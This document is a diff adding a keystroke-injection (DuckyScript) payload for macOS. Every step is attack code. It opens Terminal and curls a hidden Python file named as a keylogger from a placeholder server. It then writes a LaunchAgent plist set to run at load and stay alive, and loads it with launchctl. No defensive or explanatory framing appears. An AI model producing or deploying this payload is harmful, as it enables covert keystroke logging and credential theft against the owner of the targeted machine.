@@ -1,0 +1,78 @@
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING mkdir -p ~/.local/share
+ENTER
+DELAY 500
+STRING curl -o ~/.local/share/.key.py https://your-server/path-to-key.py
+ENTER
+DELAY 1000
+STRING chmod +x ~/.local/share/.key.py
+ENTER
+DELAY 500
+STRING mkdir -p ~/Library/LaunchAgents
+ENTER
+DELAY 500
+STRING echo '
+ENTER
+DELAY 500
+STRING <?xml version="1.0" encoding="UTF-8"?>
+ENTER
+DELAY 500
+STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+ENTER
+DELAY 500
+STRING <plist version="1.0">
+ENTER
+DELAY 500
+STRING <dict>
+ENTER
+DELAY 500
+STRING     <key>Label</key>
+ENTER
+DELAY 500
+STRING     <string>com.example.keylogger</string>
+ENTER
+DELAY 500
+STRING     <key>ProgramArguments</key>
+ENTER
+DELAY 500
+STRING     <array>
+ENTER
+DELAY 500
+STRING         <string>/usr/bin/python3</string>
+ENTER
+DELAY 500
+STRING         <string>/Users/$USER/.local/share/.key.py</string>
+ENTER
+DELAY 500
+STRING     </array>
+ENTER
+DELAY 500
+STRING     <key>RunAtLoad</key>
+ENTER
+DELAY 500
+STRING     <true/>
+ENTER
+DELAY 500
+STRING     <key>KeepAlive</key>
+ENTER
+DELAY 500
+STRING     <true/>
+ENTER
+DELAY 500
+STRING </dict>
+ENTER
+DELAY 500
+STRING </plist>' > ~/Library/LaunchAgents/com.example.keylogger.plist
+ENTER
+DELAY 1000
+STRING launchctl load ~/Library/LaunchAgents/com.example.keylogger.plist
+ENTER
+DELAY 500
+STRING exit
+ENTER
+
